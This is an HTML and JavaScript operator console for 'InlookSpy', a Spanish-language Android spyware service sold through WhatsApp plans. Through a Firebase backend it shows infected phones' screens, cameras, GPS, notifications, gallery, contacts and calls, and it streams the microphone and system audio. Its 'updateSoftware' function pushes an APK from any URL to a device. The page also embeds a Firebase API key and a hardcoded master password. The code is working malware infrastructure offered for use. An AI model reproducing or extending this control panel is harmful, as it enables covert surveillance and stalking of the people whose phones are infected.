<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>InlookSpy - Android Intelligence</title>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');
        :root { --accent: #00ff88; --bg: #050505; --card-bg: rgba(25, 25, 25, 0.9); --border: rgba(255, 255, 255, 0.08); --danger: #ff4444; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; height: 100vh; overflow: hidden; display: flex; }
        #welcome-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at center, #111, #000); z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
        .hero-title { font-size: 3.5em; font-weight: 800; color: var(--accent); letter-spacing: 5px; margin-bottom: 10px; text-shadow: 0 0 20px rgba(0,255,136,0.4); }
        .plans-container { display: flex; gap: 30px; margin-top: 50px; flex-wrap: wrap; justify-content: center; }
        .plan-card { background: var(--card-bg); border: 1px solid var(--border); padding: 40px; border-radius: 30px; width: 320px; transition: 0.3s; }
        .plan-card:hover { border-color: var(--accent); transform: translateY(-10px); }
        .plan-name { font-size: 1.5em; font-weight: 800; margin-bottom: 20px; color: #fff; }
        .plan-features { font-size: 0.9em; color: #aaa; line-height: 1.8; margin-bottom: 30px; text-align: left; height: 150px; }
        .btn-whatsapp { background: #25D366; color: #000; padding: 15px 30px; border-radius: 50px; text-decoration: none; font-weight: 800; font-size: 0.9em; display: inline-block; transition: 0.3s; }
        .btn-enter { margin-top: 60px; background: transparent; border: 1px solid #333; color: #555; padding: 10px 40px; border-radius: 50px; cursor: pointer; font-weight: 600; }
        #sidebar { width: 280px; background: #080808; border-right: 1px solid var(--border); padding: 30px 15px; display: flex; flex-direction: column; z-index: 100; box-shadow: 15px 0 50px #000; }
        .sidebar-title { color: var(--accent); font-size: 1.1em; font-weight: 800; letter-spacing: 3px; text-align: center; margin-bottom: 40px; text-transform: uppercase; }
        .device-item { padding: 18px; border: 1px solid var(--border); margin-bottom: 15px; border-radius: 12px; cursor: pointer; background: rgba(255,255,255,0.02); transition: 0.3s; display: flex; align-items: center; gap: 15px; position: relative; }
        .device-item:hover { border-color: var(--accent); transform: translateX(8px); }
        .active-device { background: var(--accent) !important; color: #000 !important; font-weight: 800; }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; position: absolute; top: 15px; right: 15px; border: 2px solid #000; }
        .dot-ONLINE { background: var(--accent); } .dot-OFFLINE { background: #444; }
        #main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: #000; }
        header { padding: 20px 40px; background: #0a0a0a; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .dashboard-grid { display: grid; grid-template-columns: 1.5fr 1fr 1.2fr; gap: 20px; padding: 20px; height: calc(100vh - 80px); box-sizing: border-box; }
        .column { display: flex; flex-direction: column; gap: 20px; overflow: hidden; }
        .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 24px; display: flex; flex-direction: column; overflow: hidden; backdrop-filter: blur(15px); transition: 0.3s; flex: 1; }
        .card-header { padding: 12px 20px; color: #888; font-weight: 700; font-size: 0.7em; text-transform: uppercase; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .card-body { padding: 15px; flex: 1; overflow-y: auto; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; }
        .live-img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .msg-row { padding: 15px; background: rgba(255,255,255,0.03); border-radius: 15px; margin-bottom: 12px; border: 1px solid var(--border); font-size: 0.85em; width: 100%; }
        .btn-icon { background: rgba(255,255,255,0.05); color: var(--accent); border: 1px solid var(--border); padding: 8px 12px; border-radius: 10px; cursor: pointer; font-size: 1.1em; transition: 0.2s; }
        .btn-icon.active { background: var(--accent) !important; color: #000 !important; box-shadow: 0 0 15px var(--accent); }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1500; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-content { background: #0f0f0f; width: 450px; height: 85vh; border-radius: 30px; border: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px; }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(75px, 1fr)); gap: 8px; width: 100%; }
        .gallery-grid img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); cursor: pointer; }
    </style>
</head>
<body>

    <div id="welcome-screen">
        <h1 class="hero-title">INLOOKSPY</h1>
        <div class="plans-container">
            <div class="plan-card">
                <div class="plan-name">STANDARD</div>
                <div class="plan-features">‚Ä¢ C√°maras (F/B)<br>‚Ä¢ Notificaciones<br>‚Ä¢ Galer√≠a<br>‚Ä¢ Ubicaci√≥n Realtime</div>
                <a href="https://w.app/vkjymz" target="_blank" class="btn-whatsapp">CONTACTAR</a>
            </div>
            <div class="plan-card" style="border-color: var(--accent);">
                <div class="plan-name" style="color: var(--accent);">PRO</div>
                <div class="plan-features">‚Ä¢ Todo Standard<br>‚Ä¢ Pantalla Live<br>‚Ä¢ Audio Sistema<br>‚Ä¢ Micro Ambiental<br>‚Ä¢ Agenda Full</div>
                <a href="https://w.app/vkjymz" target="_blank" class="btn-whatsapp">CONTACTAR</a>
            </div>
        </div>
        <button class="btn-enter" onclick="checkConsoleAccess()">ENTRAR A CONSOLA</button>
    </div>

    <div id="sidebar">
        <div class="sidebar-title">Spy Command</div>
        <div id="device-list">Buscando...</div>
    </div>

    <div id="main-content">
        <header>
            <div id="current-device-name" style="font-weight: 800; color: var(--accent);">SELECCIONE TERMINAL</div>
            <div id="header-actions" style="display: none; gap: 15px;">
                <button class="btn-icon" style="color:var(--info);" onclick="updateSoftware()"><i class="fas fa-sync-alt"></i></button>
                <button class="btn-icon" onclick="openModal('calls-modal')"><i class="fas fa-phone-alt"></i></button>
                <button class="btn-icon" onclick="openModal('contacts-modal')"><i class="fas fa-address-book"></i></button>
                <button class="btn-icon" style="color: #ff4444;" onclick="deleteDevice()"><i class="fas fa-trash"></i></button>
            </div>
        </header>

        <div id="dashboard-ui" class="dashboard-grid" style="display:none;">
            <div class="column">
                <div class="card" style="flex: 1.6;">
                    <div class="card-header">Video Pantalla
                        <div>
                            <button id="btn-int-audio" class="btn-icon" onclick="toggleInternalAudio()"><i class="fas fa-volume-up"></i></button>
                            <button class="btn-icon" style="background:var(--accent); color:#000; margin-left:10px;" onclick="sendCmd('SCREEN_START')">ON</button>
                        </div>
                    </div>
                    <div class="card-body" id="screen-container"><img id="screen-view" class="live-img"></div>
                </div>
                <div class="card">
                    <div class="card-header">C√°mara Remota <div><button class="btn-icon" onclick="sendCam('START_BACK')">BACK</button><button class="btn-icon" onclick="sendCam('START_FRONT')">FRONT</button></div></div>
                    <div class="card-body" style="padding:0;"><img id="camera-view" class="live-img"></div>
                </div>
            </div>
            <div class="card"><div class="card-header">Mensajer√≠a</div><div class="card-body" id="notif-list" style="display:block; padding:10px;"></div></div>
            <div class="column">
                <div class="card" style="flex: 0 0 auto;"><div class="card-header">GPS</div><div class="card-body" style="padding:0;"><div id="map" style="width:100%; height:180px;"></div></div></div>
                <div class="card"><div class="card-header">Galer√≠a <button class="btn-icon" onclick="sendCmd('SYNC_GALLERY')"><i class="fas fa-sync"></i></button></div><div class="card-body" style="display:block;"><div id="gallery-grid" class="gallery-grid" style="display:grid; grid-template-columns:repeat(auto-fill, minmax(70px, 1fr)); gap:5px;"></div></div></div>
                <button id="btn-mic-audio" class="btn-icon" style="background:var(--accent); color:#000; padding:15px; border-radius:15px;" onclick="toggleMicAudio()"><i class="fas fa-microphone"></i> ESCUCHAR ENTORNO</button>
            </div>
        </div>
    </div>

    <!-- MODALES -->
    <div id="contacts-modal" class="modal"><div class="modal-content"><h2>Agenda</h2><button onclick="closeModal('contacts-modal')">Cerrar</button><div id="modal-contacts-list"></div></div></div>
    <div id="calls-modal" class="modal"><div class="modal-content"><h2>Historial</h2><button onclick="closeModal('calls-modal')">Cerrar</button><div id="modal-calls-list"></div></div></div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyCZuuTlWtW20G9ksqMxB5Z_I9U0GIlNoMc", authDomain: "credipay-3d6dc.firebaseapp.com", databaseURL: "https://credipay-3d6dc-default-rtdb.firebaseio.com", projectId: "credipay-3d6dc", storageBucket: "credipay-3d6dc.appspot.com" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentId = "", audioCtx, map, marker, activeRefs = [];
        let micRef, intRef, nextMicTime = 0, nextIntTime = 0, micActive = false, intActive = false;

        function checkConsoleAccess() {
            const pass = prompt("Clave Maestra:");
            if (pass === "Inlook2024") document.getElementById('welcome-screen').style.display = 'none';
            else alert("Acceso denegado.");
        }

        db.ref('device_list').on('value', snap => {
            const list = document.getElementById('device-list'); list.innerHTML = "";
            const devices = snap.val(); if (devices) { for (let id in devices) {
                const div = document.createElement('div'); div.className = 'device-item' + (id === currentId ? ' active-device' : '');
                div.innerHTML = `<b>${devices[id]}</b><div id="dot-${id}" class="status-dot dot-OFFLINE"></div>`;
                div.onclick = () => connectToDevice(id, devices[id]); list.appendChild(div);
                db.ref(`devices/${id}/status`).on('value', s => { if(document.getElementById(`dot-${id}`)) document.getElementById(`dot-${id}`).className = "status-dot dot-" + (s.val() || "OFFLINE"); });
            }}
        });

        function connectToDevice(id, name) {
            // --- LIMPIEZA TOTAL CRITICA ---
            if (activeRefs.length > 0) { activeRefs.forEach(r => r.off()); activeRefs = []; }
            if (micRef) micRef.off(); if (intRef) intRef.off();
            micActive = false; intActive = false;
            nextMicTime = 0; nextIntTime = 0;
            updateAudioButtons();

            currentId = id;
            document.getElementById('dashboard-ui').style.display = "grid";
            document.getElementById('header-actions').style.display = "flex";
            document.getElementById('current-device-name').innerText = name.toUpperCase();

            document.getElementById('gallery-grid').innerHTML = "";
            document.getElementById('notif-list').innerHTML = "";
            document.getElementById('camera-view').src = "";
            document.getElementById('screen-view').src = "";

            if (!map) {
                map = L.map('map').setView([0, 0], 2);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                marker = L.marker([0, 0]).addTo(map);
            }

            // --- ESCUCHAS INDEPENDIENTES (PUSH A activeRefs PARA LIMPIEZA) ---
            const cRef = db.ref(`devices/${id}/camera`);
            cRef.on('value', s => { if (s.val()) document.getElementById('camera-view').src = "data:image/jpeg;base64," + s.val(); });
            activeRefs.push(cRef);

            const sRef = db.ref(`devices/${id}/screen`);
            sRef.on('value', s => { if (s.val()) document.getElementById('screen-view').src = "data:image/jpeg;base64," + s.val(); });
            activeRefs.push(sRef);

            const gRef = db.ref(`devices/${id}/gallery`).limitToLast(20);
            gRef.on('child_added', s => {
                let img = document.createElement('img'); img.src = "data:image/jpeg;base64," + s.val();
                img.onclick = () => window.open(img.src); document.getElementById('gallery-grid').prepend(img);
            });
            activeRefs.push(gRef);

            const nRef = db.ref(`devices/${id}/notifications`).limitToLast(30);
            nRef.on('child_added', s => {
                let n = s.val(); let t = new Date(n.time).toLocaleTimeString();
                let row = document.createElement('div'); row.className = 'msg-row';
                row.innerHTML = `<span style="float:right; opacity:0.3;">${t}</span><b>${n.title}</b><br>${n.text}`;
                document.getElementById('notif-list').prepend(row);
            });
            activeRefs.push(nRef);

            const lRef = db.ref(`devices/${id}/location`);
            lRef.on('value', s => { if (s.val()) { let pos = [s.val().lat, s.val().lng]; marker.setLatLng(pos); map.setView(pos, 15); } });
            activeRefs.push(lRef);

            const conRef = db.ref(`devices/${id}/contacts`);
            conRef.on('value', s => {
                const list = document.getElementById('modal-contacts-list'); list.innerHTML = "";
                if (s.val()) s.val().forEach(c => list.innerHTML += `<div class="modal-item">üë§ ${c.name}: ${c.phone}</div>`);
            });
            activeRefs.push(conRef);
        }

        function initAudio() {
            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            if (audioCtx.state === 'suspended') audioCtx.resume();
        }

        function toggleMicAudio() {
            initAudio(); micActive = !micActive;
            updateAudioButtons();
            db.ref(`devices/${currentId}/mic_cmd`).set(micActive ? "START_" + Date.now() : "STOP_" + Date.now());
            if (micRef) micRef.off();
            if (micActive) {
                nextMicTime = audioCtx.currentTime;
                micRef = db.ref(`devices/${currentId}/audio`);
                micRef.on('value', snap => { if (micActive) playAudio(snap.val(), true); });
            }
        }

        function toggleInternalAudio() {
            initAudio();
            intActive = !intActive;
            updateAudioButtons();
            db.ref(`devices/${currentId}/internal_audio_cmd`).set(intActive ? "START_" + Date.now() : "STOP_" + Date.now());
            if (intRef) intRef.off();
            if (intActive) {
                nextIntTime = audioCtx.currentTime;
                intRef = db.ref(`devices/${currentId}/internal_audio`);
                intRef.on('value', snap => { if (intActive) playAudio(snap.val(), false); });
            }
        }

        function updateAudioButtons() {
            const intBtn = document.getElementById('btn-int-audio');
            const micBtn = document.getElementById('btn-mic-audio');
            if (intBtn) { if (intActive) intBtn.classList.add('active'); else intBtn.classList.remove('active'); }
            if (micBtn) { micBtn.style.background = micActive ? '#ff4444' : 'var(--accent)'; }
        }

        function playAudio(base64, isMic) {
            if (!base64 || !audioCtx) return;
            try {
                const binary = window.atob(base64); const bytes = new Int16Array(binary.length / 2);
                for (let i = 0; i < binary.length; i += 2) bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
                const buffer = audioCtx.createBuffer(1, bytes.length, 16000);
                buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
                const source = audioCtx.createBufferSource(); source.buffer = buffer; source.connect(audioCtx.destination);
                let time = isMic ? nextMicTime : nextIntTime; if (time < audioCtx.currentTime) time = audioCtx.currentTime;
                source.start(time);
                if (isMic) nextMicTime = time + buffer.duration; else nextIntTime = time + buffer.duration;
            } catch (e) {}
        }

        function openModal(id) { document.getElementById(id).style.display = "flex"; }
        function closeModal(id) { document.getElementById(id).style.display = "none"; }
        function sendCam(cmd) { if(currentId) db.ref(`devices/${currentId}/cam_cmd`).set(cmd + "_" + Date.now()); }
        function sendCmd(cmd) { if(currentId) db.ref(`devices/${currentId}/main_cmd`).set(cmd + "_" + Date.now()); }
        function updateSoftware() { const url = prompt("Link del APK:"); if(url) sendCmd("UPDATE_APP_" + url); }
        function deleteDevice() { if(confirm("¬øEliminar?")) { db.ref(`devices/${currentId}`).remove(); db.ref(`device_list/${currentId}`).remove(); location.reload(); } }
    </script>
</body>
</html>
